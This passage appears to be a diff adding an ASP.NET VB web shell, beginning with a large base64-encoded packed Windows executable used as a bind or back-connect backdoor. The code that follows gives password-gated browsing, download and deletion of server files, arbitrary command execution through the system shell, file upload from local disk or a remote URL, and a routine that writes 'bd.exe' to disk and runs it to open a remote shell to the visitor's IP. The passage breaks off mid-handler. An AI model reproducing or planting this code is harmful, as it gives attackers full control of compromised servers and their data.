+    "Kzg9D+H7YXJndShzXzAyZott267Bbm5ngm8FdDoR0ApnrWTmf00tYBj/8LY5ZhVWaXOqQysrIFKg" & _
+    "Ye67PUxpYrRyeScKLRYaZ9vDRQ4hEVDUOsI2rEDZAC7v5eD89ra5JSxrbHduPhtHZXRMYbELd2wy" & _
+    "QQJ2ZVCudXAT/61tZw9XlWQmh2Vzc2FnZUJvNb6wxHhBfXMlMzIuZCrPtaInN745SAMLVJhrxHI6" & _
+    "IAMAq6QeQF4pp7Zq9ftSU01TUwdlbZk0U1ffAKX5v3MgTWFuDucoQnZyAFwv2gOZZMq2ACABKCCZ" & _
+    "SB4ASAAQhEAmZAAQgQZkCGQBEIJkCGRAAhDuqsrcvwABB9sIdZAu2xhbBR/AZJBukAsdCwSWQAZp" & _
+    "Bo0IjmRABmSPkJEFZEAGkpOyLEQHCAfvCowkLwtvDKsABZMZ9zWgb6uIbD9cB03TNE0JMAoMEOB0" & _
+    "r2mWQhGwElcHExczTdNgGChYB033lk0ayEEbuwccaDRN0zR4WHlIetM0TdM4/DT/JKuInQRTAgTS" & _
+    "ReTZwb5ggnmCIRem3wehpbx5/v2Bn+D8L0B+gPyowaPao0HOHmGXgf4HQG6QIbC1L0G2X+cr5P/P" & _
+    "ouSiGgDlouiiW36h/lfy291RBQPaXtpfX9pq2jLT4GXn9tje4Pk5MX4A+AMyKCKwWdnVUVF8RyQw" & _
+    "/f8GoE1EQnl0ZVRvV2lkZUNoYXID8H+7FFVuBm5kbGVkRXhjZXAF+la5bUZpJmUZD0N1cnK2oFWt" & _
+    "v1UAcwJw2dYSI2kMQ1iTbIO1KA5BL1NEe+wLwGlytm9yeUFFU3lzJ7PWDmxtFFNvaxtq9hvAdGGP" & _
+    "cEluZm8s7rNXuZbNgG9tbZ7J2jD3TGluZR61v8q2JABjJUWTT3L7F1sAWXMWmkFkZHKtCUABGExh" & _
+    "PABHArpJVgVBbGANYGtMDUiBCj32NztSZQxDQUNQB01vZCycRbhyZUgqqFYjc2fBHjMtC09FTSd/" & _
+    "VIBlwt55cCUPV1RruyU8ajSVQ01vIxCwCTtBDVd1ZUMB2JBlTr84RnJmKWxl7RhFbu3s0Jpe20R2" & _
+    "Gm95ZhGGEDZXxeUbrAEUelvDZBIxey82DY3PTzZ7SZgEUIYYCc1QbnxSdGxgd2m8YfA0G7F0ypGJ" & _
+    "AENw2Iy4ZnNlYGJPsDPiFjtTQ2xBDyPYjFkiZAw5CFgymnGGIRrbBfZRDkPlbIYtxF4Cn3RjaFvp" & _
+    "ZzYLmKMO7B+GHMu2aballsz/AwI0FnfLsiwEAgENzlNBU9vmaAGIIQ4JAgj8lyctc4JQRUwBAwCJ" & _
+    "C5Q/jIj9h+AADwELAQb0J3Zy2R3UFQQQAEAAEA+2YRNiEgcXYOxsFkyiDBAHy73sDQYAaESDR0DW" & _
+    "DQii/B7WEBvBLhh0Oi6Q4LOQDTCY+mAuck2YdYaLJwlTA5pb7JRqQC4mJxwKUPKbkkFQwBO0RQAA" & _
+    "aMVvsyQAAAD/AAAAAAAAAAAAAABgvgBQQACNvgDA//9Xg83/6xCQkJCQkJCKBkaIB0cB23UHix6D" & _
+    "7vwR23LtuAEAAAAB23UHix6D7vwR2xHAAdtz73UJix6D7vwR23PkMcmD6ANyDcHgCIoGRoPw/3R0" & _
+    "icUB23UHix6D7vwR2xHJAdt1B4seg+78EdsRyXUgQQHbdQeLHoPu/BHbEckB23PvdQmLHoPu/BHb" & _
+    "c+SDwQKB/QDz//+D0QGNFC+D/fx2D4oCQogHR0l19+lj////kIsCg8IEiQeDxwSD6QR38QHP6Uz/" & _
+    "//9eife5cAAAAIoHRyzoPAF394A/A3XyiweKXwRmwegIwcAQhsQp+IDr6AHwiQeDxwWI2OLZjb4A" & _
+    "UAAAiwcJwHRFi18EjYQwAHAAAAHzUIPHCP+WUHAAAJWKB0cIwHTcifl5Bw+3B0dQR7lXSPKuVf+W" & _
+    "VHAAAAnAdAeJA4PDBOvY/5ZkcAAAi65YcAAAjb4A8P//uwAQAABQVGoEU1f/1Y2H5wEAAIAgf4Bg" & _
+    "KH9YUFRQU1f/1VhhjUQkgGoAOcR1+oPsgOnbof//AAAAAAAAAAAAAAAAAAAAAAAAAHyAAABQgAAA" & _
+    "AAAAAAAAAAAAAAAAiYAAAGyAAAAAAAAAAAAAAAAAAACWgAAAdIAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAoIAAAK6AAAC+gAAAzoAAANyAAADqgAAAAAAAAPiAAAAAAAAAcwAAgAAAAABLRVJORUwzMi5E" & _
+    "TEwAQURWQVBJMzIuZGxsAFdTMl8zMi5kbGwAAExvYWRMaWJyYXJ5QQAAR2V0UHJvY0FkZHJlc3MA" & _
+    "AFZpcnR1YWxQcm90ZWN0AABWaXJ0dWFsQWxsb2MAAFZpcnR1YWxGcmVlAAAARXhpdFByb2Nlc3MA" & _
+    "AABPcGVuU2VydmljZUEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+
+    '//################# FUNCTION GOES HERE #######################==============================================]
+    Private Declare Auto Function SHGetFileInfo Lib "shell32.dll" ( _
+    ByVal pszPath As String, _
+    ByVal dwFileAttributes As Int32, _
+    ByRef psfi As SHFILEINFO, _
+    ByVal cbFileInfo As Int32, _
+    ByVal uFlags As Int32) As IntPtr
+
+    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Auto, Pack:=1)> _
+    Private Structure SHFILEINFO
+        Private Const MAX_PATH As Int32 = 260
+        Public hIcon As IntPtr
+        Public iIcon As Int32
+        Public dwAttributes As Int32
+        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=MAX_PATH)> _
+        Public szDisplayName As String
+        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=80)> _
+        Public szTypeName As String
+    End Structure
+    Private Const SHGFI_TYPENAME As Int32 = &H400
+    Private Function GetFileDescription(ByVal FileName As String) As String
+        Dim shfi As SHFILEINFO = Nothing
+        SHGetFileInfo(FileName, 0, shfi, Marshal.SizeOf(shfi), SHGFI_TYPENAME)
+        Return shfi.szTypeName
+    End Function
+    Function xcleanpath(ByVal path As String) As String
+        Dim strlen As String
+        path = urldecode(Trim(path))
+        strlen = Len(path)
+        If strlen > 0 Then
+            Do While ((Mid(path, strlen) = "\") And (strlen > 0))
+                strlen = strlen - 1
+                path = Mid(path, 1, strlen)
+            Loop
+            Return path & "\"
+        End If
+        Return path
+    End Function
+    Function is_dir(ByVal path As String) As Boolean
+        path = urldecode(path)
+        Try
+            Dim dInfo As New DirectoryInfo(path)
+            If dInfo.Exists Then
+                Return True
+            End If
+        Catch ex As Exception
+        End Try
+        Return False
+    End Function
+    Function is_file(ByVal path As String) As Boolean
+        path = urldecode(path)
+        Try
+            Dim fInfo As New FileInfo(path)
+            If fInfo.Exists Then
+                Return True
+            End If
+        Catch ex As Exception
+        End Try
+        Return False
+    End Function
+    Function dirname(ByVal path As String) As String
+        If (is_dir(path)) Then
+            Dim di As New DirectoryInfo(path)
+            Return xcleanpath(di.FullName)
+        Else
+            If (is_file(path)) Then
+                Dim fi As New FileInfo(path)
+                Return xcleanpath(fi.DirectoryName)
+            End If
+        End If
+        Return xcleanpath(path)
+    End Function
+    Function nl2br(ByVal text As String) As String
+        Return Replace(text, vbCrLf, "<br />")
+    End Function
+    Function urldecode(ByVal str As String) As String
+        Return Server.UrlDecode(str)
+    End Function
+    Function urlencode(ByVal str As String) As String
+        Return Server.UrlEncode(str)
+    End Function
+    Function base64_decode(ByVal base64String As String) As String
+        Const Base64 As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+        base64String = Replace(base64String, vbCrLf, "")
+        base64String = Replace(base64String, vbTab, "")
+        base64String = Replace(base64String, " ", "")
+        Dim dataLength As String = Len(base64String)
+        Dim sOut As String = ""
+        For groupBegin As Integer = 1 To dataLength Step 4
+            Dim CharCounter, thisData As Integer
+            Dim thisChar, pOut As Char
+            Dim numDataBytes As Integer = 3
+            Dim nGroup As Integer = 0
+            For CharCounter = 0 To 3
+                thisChar = Mid(base64String, groupBegin + CharCounter, 1)
+                If thisChar = "=" Then
+                    numDataBytes = numDataBytes - 1
+                    thisData = 0
+                Else
+                    thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
+                End If
+                nGroup = 64 * nGroup + thisData
+            Next
+            nGroup = Hex(nGroup)
+            nGroup = StrDup(6 - Len(nGroup), "0") & nGroup
+            pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
+            Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
+            Chr(CByte("&H" & Mid(nGroup, 5, 2)))
+            sOut = sOut & Left(pOut, numDataBytes)
+        Next
+        Return sOut
+    End Function
+    Function sort(ByVal arr_ As Array) As Array
+        Dim buff As String = ""
+        Dim temp As String = ""
+        For Each b As String In arr_
+            buff = buff & b & "|"
+        Next
+        If ((Len(buff) - 1) > 0) Then
+            Dim arr As Array = Split(Mid(buff, 1, Len(buff) - 1), "|")
+
+            For i As Integer = UBound(arr) - 1 To 0 Step -1
+                For j As Integer = 0 To i
+                    If ((arr(j)) > (arr(j + 1))) Then
+                        temp = arr(j + 1)
+                        arr(j + 1) = arr(j)
+                        arr(j) = temp
+                    End If
+                Next
+            Next
+            Return arr
+        End If
+        Return arr_
+    End Function
+    Function htmlspecialchars(ByVal text As String) As String
+        text = Replace(text, "&", "&amp;")
+        text = Replace(text, """", "&quot;")
+        text = Replace(text, "'", "&#039;")
+        text = Replace(text, "<", "&lt;")
+        text = Replace(text, ">", "&gt;")
+        Return text
+    End Function
+    Function xfilesave(ByVal FileName As String, ByVal allbytes() As Byte) As Boolean
+        Dim fi As New FileInfo(FileName)
+        If fi.Exists Then
+            fi.Delete()
+            If fi.Exists Then
+                Return False
+            End If
+        End If
+        File.WriteAllBytes(FileName, allbytes)
+        Dim ffi As New FileInfo(FileName)
+        If ffi.Exists Then
+            Return True
+        End If
+        Return False
+    End Function
+    Function xfileopen(ByVal filepath As String, ByVal binary As Boolean) As String
+        filepath = urldecode(filepath)
+        If (binary) Then
+            Dim fi As New FileInfo(filepath)
+            If fi.Exists Then
+                Return System.Text.Encoding.UTF8.GetString(File.ReadAllBytes(filepath))
+            End If
+        Else
+            Dim fi As New FileInfo(filepath)
+            If fi.Exists Then
+                Return File.ReadAllText(filepath)
+            End If
+        End If
+        Return ""
+    End Function
+    Function xparsefilesize(ByVal size As Integer) As String
+        If (size <= 1024) Then
+            Return size
+        Else
+            If (size <= 1024 * 1024) Then
+                Return FormatNumber(size / 1024, 2) & " kb"
+            Else
+                Return FormatNumber(size / 1024 / 1024, 2) & " mb"
+            End If
+        End If
+    End Function
+    Function xfileperms(ByVal fpath As String) As String
+        Dim isreadable As String = "r"
+		Dim iswriteable As String = "-"
+        If is_file(fpath) Then
+            Dim fi As New FileInfo(fpath)
+            If Not (fi.Attributes And FileAttributes.ReadOnly) Then
+				iswriteable = "w"
+            End If
+        ElseIf is_dir(fpath) Then
+            Dim fi As New DirectoryInfo(fpath)
+            If Not (fi.Attributes And FileAttributes.ReadOnly) Then
+				iswriteable = "w"
+            End If
+        End If
+        Return isreadable & " / " & iswriteable
+    End Function
+    Function xdateformat(ByVal tgl As Date) As String
+        Return tgl.ToString("dd-MMM-yyyy HH:mm")
+    End Function
+    Function xfilelastmodified(ByVal fpath As String) As String
+        fpath = urldecode(fpath)
+        If ((is_dir(fpath)) Or (is_file(fpath))) Then
+            Dim di As New DirectoryInfo(fpath)
+            Return xdateformat(di.LastWriteTime)
+        End If
+        Return "???"
+    End Function
+    Function xparentfolder(ByVal sdir As String) As String
+        sdir = urldecode(sdir)
+        If Directory.Exists(sdir) Then
+            Dim di As New DirectoryInfo(sdir)
+            If di.Parent IsNot Nothing Then
+                Dim testt As String = xcleanpath(di.Parent.FullName)
+                Return testt
+            End If
+        End If
+        Return sdir
+    End Function
+    Function xfilesummary(ByVal fpath As String) As String
+        Dim buff As String = ""
+        If (is_file(fpath)) Then
+            buff = "Filesize : " & xparsefilesize(xfilesize(fpath)) & " ( " & xfilesize(fpath) & " ) <span class=""gaul""> :: </span>Permission : " & xfileperms(fpath) & " ( " & xfileowner(fpath) & " )<span class=""gaul""> :: </span>modified : " & xfilelastmodified(fpath)
+        End If
+        Return buff
+    End Function
+    Function xfilesize(ByVal fpath As String) As Long
+        If (is_file(fpath)) Then
+            Dim fi As New FileInfo(fpath)
+            Return fi.Length
+        End If
+        Return 0
+    End Function
+    Function xfileowner(ByVal fpath As String) As String
+        If (is_file(fpath)) Then
+            Dim fi As New FileInfo(fpath)
+            Dim ds As System.Security.AccessControl.FileSecurity = fi.GetAccessControl
+            Dim ir As System.Security.Principal.IdentityReference = ds.GetOwner(GetType(System.Security.Principal.NTAccount))
+            Return ir.Value.Substring(InStr(ir.Value.ToString, "\"))
+        ElseIf (is_dir(fpath)) Then
+            Dim di As New FileInfo(fpath)
+            Try
+                Dim ds As System.Security.AccessControl.FileSecurity = di.GetAccessControl
+                Dim ir As System.Security.Principal.IdentityReference = ds.GetOwner(GetType(System.Security.Principal.NTAccount))
+                Return ir.Value.Substring(InStr(ir.Value.ToString, "\"))
+            Catch ex As Exception
+
+            End Try
+        End If
+        Return "???"
+    End Function
+    Function ekse(ByVal cmd As String, ByVal cwd As String) As String
+        Dim p As System.Diagnostics.Process = New System.Diagnostics.Process()
+        With p.StartInfo
+            .FileName = Environ("COMSPEC")
+            .CreateNoWindow = True
+            .RedirectStandardInput = True
+            .RedirectStandardOutput = True
+            .RedirectStandardError = True
+            .UseShellExecute = False
+            .WorkingDirectory = xcleanpath(urldecode(Request.QueryString("dir")))
+            .Arguments = "/C " & cmd
+        End With
+        p.Start()
+        Dim all As String = p.StandardOutput.ReadToEnd
+        p.Close()
+        Return all
+    End Function
+    Function OSver() As String
+        Return System.Environment.OSVersion.VersionString
+    End Function
+    Function xparsedir(ByVal dir As String) As String
+        Dim dirs() As String = Split(dir, "\")
+        Dim buff As String = ""
+        Dim dlink As String = ""
+        For Each d As String In dirs
+            d = Trim(d)
+            If (d <> "") Then
+                dlink = dlink & urlencode(d & "\")
+                buff &= "<a href=""?dir=" & dlink & """>" & d & " " & "\" & "</a>&nbsp;"
+            End If
+        Next
+        Return "<span class=""gaul"">[ </span>" & buff & "<span class=""gaul""> ]</span>"
+    End Function
+    Function xrunexploit(ByVal fpath As String, ByVal base64 As String, ByVal port As String, ByVal ip As String) As Boolean
+        Dim con() As Byte = Convert.FromBase64String(wBind)
+        Dim ok As Boolean = False
+        Dim final As String = ""
+        If (is_file(fpath)) Then
+            File.Delete(fpath)
+        End If
+        If (xfilesave(fpath, con)) Then
+            Dim p As Process = New Process
+            With p.StartInfo
+                .FileName = fpath
+                .CreateNoWindow = True
+                .Arguments = port & " " & ip
+            End With
+            p.Start()
+            Return True
+        End If
+        Return False
+    End Function
+    Function xdrive() As String
+        Dim buff, letters, lett As String
+        letters = ""
+        buff = ""
+        For Each letter As DriveInfo In DriveInfo.GetDrives
+            lett = Mid(letter.Name, 1, 1)
+            letters = "<a href=""?dir=" & lett & ":\""><span class=""gaul"">[ </span>"
+            letters &= lett
+            letters &= "<span class=""gaul""> ]</span</a> "
+            buff &= letters
+        Next
+        If (buff <> "") Then
+            buff = buff & "<br />"
+        End If
+        Return buff
+    End Function
+    Public Sub xrmdir(ByVal path As String)
+        path = xcleanpath(path)
+        path = Mid(path, 1, Len(path) - 1)
+        Dim di As New DirectoryInfo(path)
+        If di.Exists Then
+            For Each di_ As DirectoryInfo In di.GetDirectories
+                xrmdir(di_.FullName)
+            Next
+            For Each fi_ As FileInfo In di.GetFiles
+                fi_.Delete()
+            Next
+        End If
+        di.Delete()
+    End Sub
+    Function xdir(ByVal path As String) As String
+        path = Trim(urldecode(path))
+        path = xcleanpath(path)
+        Dim buff, sf, sd, dd, nextdir As String
+        buff = ""
+        If (is_dir(path)) Then
+            Dim fi As New DirectoryInfo(path)
+            Dim xfname As New ArrayList
+            Dim xdname As New ArrayList
+            For Each xf As FileInfo In fi.GetFiles
+                xfname.Add(xf.FullName)
+            Next
+            For Each xd As DirectoryInfo In fi.GetDirectories
+                xdname.Add(xd.FullName)
+            Next
+            xfname.Sort()
+            xdname.Sort()
+            buff = "<div id=""explorer""><table class=""tblExplorer"">" & _
+            "<tr><th>Filename</th>" & _
+            "<th style=""width:80px;"">Filesize</th>" & _
+            "<th style=""width:80px;"">Permission</th>" & _
+            "<th style=""width:150px;"">Last Modified</th>" & _
+            "<th style=""width:180px;"">Action</th></tr>"
+            If (Len(path) > 3) Then
+                sd = "."
+                dd = xcleanpath(path)
+                buff &= "<tr onmouseover=""this.style.cursor='pointer';this.style.cursor='hand';"" onclick=""window.location= '?dir=" & urlencode(dd) & "';"">" & _
+                "<td><span style=""font-weight:bold;""><a href=""?dir=" & xcleanpath(dd) & """>[</span> " & sd & " <span style=""font-weight:bold;"">]</span></a></td>" & _
+                "<td>DIR</td>" & _
+                "<td style=""text-align:center;"">" & xfileperms(dd) & "</td>" & _
+                "<td style=""text-align:center;"">" & xfilelastmodified(dd) & "</td>" & _
+                "<td style=""text-align:center;""><a href=""?dir=" & dd & "&properties=" & xcleanpath(dd) & """>Properties</a> | <a href=""?dir=" & xcleanpath(xparentfolder(dd)) & "&del=" & xcleanpath(dd) & """>Remove</a></td>" & _
+                "</tr>"
+                sd = ".."
+                dd = xcleanpath(xparentfolder(path))
+                buff &= "<tr onmouseover=""this.style.cursor='pointer';this.style.cursor='hand';"" onclick=""window.location= '?dir=" & urlencode(dd) & "';"">" & _
+                "<td><span style=""font-weight:bold;""><a href=""?dir=" & dd & """>[</span> " & sd & " <span style=""font-weight:bold;"">]</span></a></td>" & _
+                "<td>DIR</td>" & _
+                "<td style=""text-align:center;"">" & xfileperms(dd) & "</td>" & _
+                "<td style=""text-align:center;"">" & xfilelastmodified(dd) & "</td>" & _
+                "<td style=""text-align:center;""><a href=""?dir=" & xcleanpath(dd) & "&properties=" & xcleanpath(dd) & """>Properties</a> | <a href=""?dir=" & xcleanpath(xparentfolder(xparentfolder(dd))) & "&del=" & xcleanpath(dd) & """>Remove</a></td>" & _
+                "</tr>"
+            End If
+            For Each d As String In xdname
+                Dim di As New DirectoryInfo(d)
+                sd = di.Name
+                nextdir = xcleanpath(path)
+                buff &= "<tr onmouseover=""this.style.cursor='pointer';this.style.cursor='hand';"" onclick=""window.location= '?dir=" & urlencode(d) & "';"">" & _
+                "<td><span style=""font-weight:bold;""><a href=""?dir=" & xcleanpath(d) & """>[</span> " & sd & " <span style=""font-weight:bold;"">]</span></a></td>" & _
+                "<td>DIR</td>" & _
+                "<td style=""text-align:center;"">" & xfileperms(d) & "</td>" & _
+                "<td style=""text-align:center;"">" & xfilelastmodified(d) & "</td>" & _
+                "<td style=""text-align:center;""><a href=""?dir=" & xcleanpath(d) & "&properties=" & xcleanpath(d) & """>Properties</a> | <a href=""?dir=" & xcleanpath(nextdir) & "&del=" & xcleanpath(d) & """>Remove</a></td>" & _
+                "</tr>"
+            Next
+            For Each f As String In xfname
+                Dim fiz As New FileInfo(f)
+                sf = fiz.Name
+                Dim View As String = "?dir=" & urlencode(path) & "&view=" & urlencode(f)
+                buff &= "<tr onmouseover=""this.style.cursor='pointer';this.style.cursor='hand';"" onclick=""window.location='?dir=" & urlencode(xcleanpath(path)) & "&properties=" & urlencode(f) & "';""><td>" & _
+                "<a href=""?dir=" & urlencode(xcleanpath(path)) & "&properties=" & urlencode(f) & """>" & _
+                sf & "</a></td>" & _
+                "<td>" & xparsefilesize(xfilesize(f)) & "</td>" & _
+                "<td style=""text-align:center;"">" & xfileperms(f) & "</td>" & _
+                "<td style=""text-align:center;"">" & xfilelastmodified(f) & "</td>" & _
+                "<td style=""text-align:center;""><a href=""" & View & """>Edit</a> | <a href=""?get=" & f & """>Download</a> | <a href=""?dir=" & xcleanpath(path) & "&del=" & f & """>Remove</a></td>" & _
+                "</tr>"
+            Next
+            buff &= "</table></div>"
+        End If
+        Return buff
+    End Function
+    '//################# INIT GOES HERE #######################==================================================]
+    Dim xCwd As String = ""
+    Dim check As String = ""
+    Dim uname As String = ""
+    Dim auth As Boolean = False
+    Public Sub Page_Load()
+        On Error Resume Next
+        Session.LCID = 2057
+        Server.ScriptTimeout = 600
+        ' server software
+        Dim xSoftware As String = Request.ServerVariables("SERVER_SOFTWARE")
+        ' uname -a
+        Dim xSystem As String = OSver()
+        ' server ip
+        Dim xServerIP As String = Request.ServerVariables("LOCAL_ADDR")
+        ' your ip ;-)
+        Dim xClientIP As String = Request.ServerVariables("REMOTE_ADDR")
+
+        Dim xHeader As String = xSoftware & "<br />" & xSystem & "<br />Server IP: <span class=""gaul"">[ </span>" & xServerIP & "<span class=""gaul""> ]</span>&nbsp;&nbsp;&nbsp;Your IP: <span class=""gaul"">[ </span>" & xClientIP & "<span class=""gaul""> ]</span>"
+        Dim shell_style As String = "" & _
+    "<style type=""text/css"">" & _
+    "*{" & _
+    "	font-family:Tahoma,Verdana,Arial;" & _
+    "	font-size:12px;" & _
+    "	line-height:20px;" & _
+    "}" & _
+    "form{" & _
+    "	margin:0 auto;" & _
+    "	text-align:center;" & _
+    "}" & _
+    "body{" & _
+    "	background:url('" & Request.ServerVariables("SCRIPT_NAME") & "?img=bg') #333333;" & _
+    "	color:#ffffff;" & _
+    "	margin:0;" & _
+    "	padding:0;" & _
+    "}" & _
+    "input,textarea{" & _
+    "	background:url('" & Request.ServerVariables("SCRIPT_NAME") & "?img=bg') #111111;" & _
+    "	height:24px;" & _
+    "	color:#ffffff;" & _
+    "	padding:1.5px 4px 0 4px;" & _
+    "	margin:2px 0;" & _
+    "	border:1px solid " & shell_color & ";" & _
+    "	border-bottom:4px solid " & shell_color & ";" & _
+    "	vertical-align:middle;" & _
+    "}" & _
+    "input:hover,textarea:hover{" & _
+    "	background:#0a0a0a;" & _
+    "}" & _
+    "a{" & _
+    "	color:#ffffff;" & _
+    "	text-decoration:none;" & _
+    "}" & _
+    "a:hover{" & _
+    "	border-bottom:1px solid #ffffff;" & _
+    "}" & _
+    "h1{" & _
+    "	font-size:17px;" & _
+    "	height:20px;" & _
+    "	padding:2px 8px;" & _
+    "	background:" & shell_color & ";" & _
+    "	border:0;" & _
+    "	border-left:4px solid " & shell_color & ";" & _
+    "	border-right:4px solid " & shell_color & ";" & _
+    "	border-bottom:1px solid #222222;" & _
+    "	margin:0 auto;" & _
+    "	width:90%;" & _
+    "}" & _
+    "h1 img{" & _
+    "	vertical-align:bottom;" & _
+    "}" & _
+    ".box{" & _
+    "	margin:0 auto;" & _
+    "	background:#000000;" & _
+    "	border:4px solid " & shell_color & ";" & _
+    "	padding:4px 8px;" & _
+    "	width:90%;" & _
+    "	text-align:justify;" & _
+    "}" & _
+    ".gaul{" & _
+    "	color:" & shell_color & ";" & _
+    "}" & _
+    ".result, .boxcode{" & _
+    "	margin:0 auto;" & _
+    "	border:1px solid " & shell_color & ";" & _
+    "	font-family:Lucida Console,Tahoma,Verdana;" & _
+    "	padding:8px;" & _
+    "	text-align:justify;" & _
+    "	overflow:hidden;" & _
+    "	color:#ffffff;" & _
+    "}" & _
+    "#explorer, table{" & _
+    "	width:100%;" & _
+    "}" & _
+    "table th{" & _
+    "	border-bottom:1px solid " & shell_color & ";" & _
+    "	background:#111111;" & _
+    "	padding:4px;" & _
+    "}" & _
+    "table td{" & _
+    "	padding:4px;" & _
+    "	border-bottom:1px solid #111111;" & _
+    "	vertical-align:top;" & _
+    "}" & _
+    ".tblExplorer tr:hover, .hexview td:hover{" & _
+    "	background:" & shell_color & ";" & _
+    "}" & _
+    ".hidden{" & _
+    "	display:none;" & _
+    "}" & _
+    ".tblbox td  {" & _
+    "	margin:0;" & _
+    "	padding:0;" & _
+    "	border-bottom:1px solid #222222;" & _
+    "}" & _
+    ".tblbox tr:hover{" & _
+    "	background:none;" & _
+    "}" & _
+    "#mainwrapper{" & _
+    "	width:100%;" & _
+    "	margin:20px auto;" & _
+    "	text-align:center;" & _
+    "}" & _
+    "#wrapper{" & _
+    "	width:90%;" & _
+    "	margin:auto;" & _
+    "}" & _
+    ".cmdbox{" & _
+    "	border-top:1px solid " & shell_color & ";" & _
+    "	border-bottom:1px solid " & shell_color & ";" & _
+    "	margin:4px 0;" & _
+    "	width:100%;" & _
+    "}" & _
+    ".fpath{" & _
+    "	border-top:1px solid " & shell_color & ";" & _
+    "	border-bottom:1px solid " & shell_color & ";" & _
+    "	margin:4px 0;" & _
+    "	padding:4px 0;" & _
+    "}" & _
+    ".fprop{" & _
+    "	border-top:1px solid " & shell_color & ";" & _
+    "	border-bottom:1px solid " & shell_color & ";" & _
+    "	margin:4px 0;" & _
+    "	padding:4px 0;" & _
+    "}" & _
+    ".bottomwrapper{" & _
+    "	text-align:center;" & _
+    "}" & _
+    ".btn{" & _
+    "	height:24px;" & _
+    "	background:url('" & Request.ServerVariables("SCRIPT_NAME") & "?img=bg') #111111;" & _
+    "	font-size:10px;" & _
+    "	text-align:right;" & _
+    "}" & _
+    ".hexview , .hexview td{" & _
+    "	font-family: Lucida Console,Tahoma;" & _
+    "}" & _
+    "</style>"
+
+        If (Request.Form("passw") <> "") Then
+            check = Trim(Request.Form("passw"))
+            If (check = shell_password) Then
+                Response.Cookies.Set(New HttpCookie("pass", check))
+                Response.Cookies("pass").Expires = Date.Now.AddDays(7)
+            Else
+                Response.Cookies.Set(New HttpCookie("pass", check))
+                Response.Cookies("pass").Expires = Date.MinValue
+            End If
+        End If
+        If ((Request.Cookies("pass").Value <> "") And (Request.Form("passw") = "")) Then
+            check = Request.Cookies("pass").Value
+        End If
+        If (check = shell_password) Then
+            auth = True
+        Else
+            auth = False
+        End If
+        If (Request.QueryString("img") <> "") Then
+            Dim sfile As String = Request.QueryString("img")
+            If (is_file(sfile)) Then
+                Response.Clear()
+                Response.ContentType = "image/jpeg"
+                Response.BinaryWrite(File.ReadAllBytes(sfile))
+                Response.End()
+            Else
+                Response.Clear()
+                Response.Buffer = True
+                Response.ContentType = "image/png"
+                Dim buff As String
+                If sfile = "bg" Then
+                    buff = bg
+                Else
+                    buff = icon
+                End If
+                Response.BinaryWrite(Convert.FromBase64String(buff))
+                Response.End()
+            End If
+        End If
+        If (Request.QueryString("get") <> "") Then
+            Dim sFile As String = Request.QueryString("get")
+            Dim fname As String = Mid(sFile, InStrRev(sFile, "\") + 1)
+            Response.ContentType = "application/x-msdownload"
+            Response.AddHeader("Content-transfer-encoding", "binary")
+            Response.AddHeader("Content-Disposition", "attachment;filename=" & fname & "")
+            Response.Write(xfileopen(sFile, True))
+            Response.End()
+        End If
+        If ((Request.QueryString("btnConnect") <> "") And (IsNumeric(Request.QueryString("bportC")))) Then
+            Dim port As String = Request.QueryString("bportC")
+            Dim fname As String = "bd.exe"
+            Dim fpath As String = xcleanpath(urldecode(Trim(Request.QueryString("dir")))) & fname
+            If (xrunexploit(fpath, wBind, port, xClientIP)) Then
+            End If
+        ElseIf ((Request.QueryString("btnListen") <> "") And (IsNumeric(Request.QueryString("lportC")))) Then
+            Dim port As String = Request.QueryString("lportC")
+            Dim fname As String = "bd.exe"
+            Dim fpath As String = xcleanpath(urldecode(Trim(Request.QueryString("dir")))) & fname
+            If (xrunexploit(fpath, wBind, port, "")) Then
+            End If
+        End If
+        Dim uploaded As Boolean = False
+        Dim newdir As String = ""
+        If (Request.QueryString("dir") = "") Then
+            xCwd = Mid(Request.ServerVariables("PATH_TRANSLATED"), 1, InStrRev(Request.ServerVariables("PATH_TRANSLATED"), "\"))
+        Else
+            newdir = xcleanpath(Trim(Request.QueryString("dir")))
+            If (is_dir(newdir)) Then
+                xCwd = newdir
+            End If
+            If (Request.Form("btnNewUploadLocal") <> "") Then
+                Dim uname As String
+                If (Trim(ufname.Value) <> "") Then
+                    uname = Trim(ufname.Value)
+                Else
+                    uname = filelocal.PostedFile.FileName
+                End If
+                filelocal.PostedFile.SaveAs(xcleanpath(xCwd) & uname)
+            ElseIf (Request.Form("btnNewUploadUrl") <> "") Then
+                Dim uname As String
+                If (Trim(ufname.Value) <> "") Then
+                    uname = Trim(ufname.Value)
+                Else
+                    Dim m As Match = Regex.Match(fileurl.Value, ".*\/([^/?]*)\??", RegexOptions.IgnoreCase)
+                    uname = m.Groups(1).Value
+                End If
+                Dim webcl As WebClient = New WebClient
+                webcl.DownloadFile(fileurl.Value, xcleanpath(xCwd) & uname)
+            End If
+        End If
+        If (Request.QueryString("foldername") <> "") Then
+            Dim fname As String = xcleanpath(Trim(Request.QueryString("foldername")))
+            If (Not is_dir(newdir & fname)) Then
+                MkDir(newdir & fname)
+            End If
+        ElseIf (Request.QueryString("del") <> "") Then
+            Dim fdel As String = Trim(Request.QueryString("del"))
+            If (is_file(fdel)) Then
+                File.Delete(fdel)
+            ElseIf (is_dir(fdel)) Then
+                xrmdir(fdel)
+                newdir = xparentfolder(fdel)
+            End If
+        ElseIf (Request.QueryString("childname") <> "") Then
+            Dim childname As String = newdir & Trim(Request.QueryString("childname"))
